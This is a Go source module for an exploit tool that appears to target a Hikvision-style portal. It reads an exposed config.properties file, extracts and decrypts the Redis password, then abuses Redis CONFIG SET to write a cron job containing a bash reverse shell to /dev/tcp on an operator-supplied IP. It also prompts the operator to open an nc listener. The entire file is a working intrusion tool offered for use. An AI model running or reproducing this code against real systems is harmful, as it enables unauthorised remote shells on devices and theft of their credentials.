package modules

import (
	"crypto/tls"
	"fmt"
	"github.com/go-redis/redis"
	"github.com/go-resty/resty/v2"
	"log"
	"net"
	"net/http"
	"strings"
	"time"
)

var cronPath = []string{"/var/spool/cron/crontabs", "/var/spool/cron"}
var vulnPath = "/portal/conf/config.properties"

type Hik struct {
	IP                      string
	Port                    string
	Target                  string
	redisPasswordEncrypted  string
	redisPasswordDecrypted  string
	redisOriginalDir        string
	redisOriginalDbFilename string
	redisHost               string
	redisPort               string
	hikOsInfo               int //0 linux 1 windows
	redisOsInfo             int //0 linux 1 windows
	Exploit                 bool
	isVuln                  bool
	canGetShell             bool
	configProperties        string
	Cmd                     string
}

func (h *Hik) check() {
	h.Target, h.redisHost, _ = UrlChecker(h.Target)
	client := resty.New()
	client.SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76")
	client.SetRedirectPolicy(resty.NoRedirectPolicy())
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.SetTimeout(10 * time.Second)
	client.SetBaseURL(h.Target)
	res, err := client.R().Get(vulnPath)
	if err != nil {
		h.isVuln = false
	}
	if res.StatusCode() == http.StatusOK {
		resData := string(res.Body())
		if strings.Contains(resData, "portalcache") {
			h.configProperties = resData
			h.isVuln = true
			h.extractRedisInfo()
			h.checkPort()
		} else {
			h.isVuln = false
		}
	} else {
		h.isVuln = false
	}
}
func (h *Hik) exploit() {
	h.checkRedis()
	if h.redisOriginalDir == "" {
		log.SetPrefix("[-] ")
		log.Fatalln("Can Not Connect To Target's Redis.")
	}
	for {
		fmt.Printf("Input Reverse IP:")
		fmt.Scanf("%s\n", &h.IP)
		if IPChecker(h.IP) {
			break
		} else {
			log.SetPrefix("[!] ")
			log.Println("Reverse IP Invalid")
		}
	}
	for {
		fmt.Printf("Input Reverse Port:")
		fmt.Scanf("%s\n", &h.Port)
		if PortChecker(h.Port) {
			break
		} else {
			log.SetPrefix("[!] ")
			log.Println("Reverse Port Invalid")
		}
	}
	log.SetPrefix("[!] ")
	log.Printf("Reserve Server %s Ready?????[nc -lvp %s]:", h.IP, h.Port)
	fmt.Scanln()
	h.reserveShell()
	log.SetPrefix("[+] ")
	log.Println("Exploit Finish,If Failed Please Try Again.")
}
func (h *Hik) checkRedis() {
	rdb := redis.NewClient(&redis.Options{
		Addr:     h.redisHost + ":" + h.redisPort,
		Password: h.redisPasswordDecrypted,
		DB:       0,
	})
	_, err := rdb.Ping().Result()
	if err != nil {
		return
	}
	redisDbFilename, _ := rdb.ConfigGet("dbfilename").Result()
	redisDir, _ := rdb.ConfigGet("dir").Result()
	log.SetPrefix("[!] ")
	log.Println("redis dir: " + redisDir[1].(string))
	log.Println("redis dbfilename: " + redisDbFilename[1].(string))
	h.redisOriginalDbFilename = redisDbFilename[1].(string)
	h.redisOriginalDir = redisDir[1].(string)
	if strings.Contains(h.redisOriginalDir, "linux") {
		h.hikOsInfo = 0
		h.redisOsInfo = 0
	}
}
func (h *Hik) reserveShell() {
	rdb := redis.NewClient(&redis.Options{
		Addr:     h.redisHost + ":" + h.redisPort,
		Password: h.redisPasswordDecrypted,
		DB:       0,
	})
	h.Cmd = fmt.Sprintf(`

* * * * * bash -i>& /dev/tcp/%s/%s 0>&1

`, h.IP, h.Port)
	rdb.Set("xxx", h.Cmd, 0)
	rdb.ConfigSet("dir", cronPath[1])
	rdb.ConfigSet("dbfilename", "root")
	rdb.Save()
	log.SetPrefix("[!] ")
	log.Println("Waiting For Reverse.......")
	time.Sleep(5 * time.Second)
	rdb.ConfigSet("dir", h.redisOriginalDir)
	rdb.ConfigSet("dbfilename", h.redisOriginalDbFilename)
}
func (h *Hik) extractRedisInfo() {
	for _, v := range strings.Split(h.configProperties, "\n") {
		if strings.Contains(v, "portalcache") && strings.Contains(v, "password") {
			h.redisPasswordEncrypted = strings.SplitN(v, "=", 2)[1]
			continue
		}
		if strings.Contains(v, "portalcache") && strings.Contains(v, "port") {
			h.redisPort = strings.Split(v, "=")[1]
			continue
		}
	}
}
func (h *Hik) checkPort() {

	conn, err := net.DialTimeout("tcp", h.redisHost+":"+h.redisPort, 3*time.Second)
	if err != nil {
		h.canGetShell = false
	} else {
		if conn != nil {
			h.canGetShell = true
		} else {
			h.canGetShell = false
		}
	}
}
func (h *Hik) Run() {
	h.check()
	if h.isVuln {
		if h.canGetShell {
			log.Printf("Target %s Is Vuln And Can GetShell With Redis.\n", h.Target)
			if h.Exploit {
				log.SetPrefix("[!] ")
				log.Printf("Targets %s Redis Encrypt Password is %s\n", h.Target, h.redisPasswordEncrypted)
				log.Println("Trying To Decrypt....")
				results, err := DecryptData(h.redisPasswordEncrypted)
				if err != nil {
					log.Println("Decrypt Auto Failed.")
					log.Printf("Input Decrypted Password To Exploit:")
					fmt.Scanf("%s\n", &h.redisPasswordDecrypted)
					if h.redisPasswordDecrypted == "" {
						log.SetPrefix("[-] ")
						log.Fatalln("Input Password Invalid.")
					}
				}
				log.Printf("Decrypted Password Is: %s\n", results)
				h.redisPasswordDecrypted = results
				h.exploit()
			}
		} else {
			log.SetPrefix("[-] ")
			log.Printf("Target %s Is Vuln But Can Not GetShell With Redis.\n", h.Target)
		}

	} else {
		log.SetPrefix("[-] ")
		log.Printf("Target %s Is Safe.\n", h.Target)
	}
}
